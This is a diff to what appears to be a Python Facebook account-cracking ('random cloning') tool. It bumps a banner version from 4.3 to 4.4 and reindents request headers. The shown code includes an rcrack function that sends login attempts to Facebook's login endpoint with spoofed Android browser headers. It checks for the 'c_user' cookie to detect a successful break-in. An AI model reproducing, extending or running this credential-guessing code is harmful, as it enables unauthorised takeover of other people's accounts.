@@ -141,7 +141,7 @@ _ooooo_________oo____oooo__ooooo__oo_____oo_ooooooo_
 \x1b[1;92m│\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m STATUS     \x1b[1;97m: \x1b[1;97mRANDOM CLONING 
 \x1b[1;92m│\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m TYPE       \x1b[1;97m: \x1b[1;97mFREE    
 \x1b[1;92m│\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m GITHUB     \x1b[1;97m:\x1b[1;97m《JAMILVISAL》
-\x1b[1;92m│\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m VERSION    \x1b[1;97m:\x1b[1;97m《4.3》         
+\x1b[1;92m│\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m VERSION    \x1b[1;97m:\x1b[1;97m《4.4》         
 \x1b[1;92m┗─────────────────────────────────────────┛    """
 
 khld = """
@@ -165,7 +165,7 @@ ____________________________________________________
 \x1b[1;92m│\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m STATUS     \x1b[1;97m: \x1b[1;97mRANDOM CLONING 
 \x1b[1;92m│\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m TYPE       \x1b[1;97m: \x1b[1;97mFREE    
 \x1b[1;92m│\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m GITHUB     \x1b[1;97m:\x1b[1;97m《JAMILVISAL》
-\x1b[1;92m│\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m VERSION    \x1b[1;97m:\x1b[1;97m《4.3》         
+\x1b[1;92m│\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m VERSION    \x1b[1;97m:\x1b[1;97m《4.4》         
 \x1b[1;92m┗─────────────────────────────────────────┛  """
 
 def main():
@@ -231,21 +231,21 @@ def rcrack(uid,pwx,tl):
             'method': 'GET',
             'path': '/',
             'scheme': 'https',
-           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-           'accept-language': 'en-GB,en;q=0.9,ps-AF;q=0.8,ps;q=0.7,en-US;q=0.6',
-           'cache-control': 'max-age=0',
-           'sec-ch-prefers-color-scheme': 'light',
-           'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-           'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
-           'sec-ch-ua-mobile': '?1',
-           'sec-ch-ua-platform': '"Android"',
-           'sec-ch-ua-platform-version': '"10.0.0"',
-           'sec-fetch-dest': 'document',
-           'sec-fetch-mode': 'navigate',
-           'sec-fetch-site': 'none',
-           'sec-fetch-user': '?1',
-           'upgrade-insecure-requests': '1',
-           'user-agent': pro,}
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-GB,en;q=0.9,ps-AF;q=0.8,ps;q=0.7,en-US;q=0.6',
+            'cache-control': 'max-age=0',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro,}
 			lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
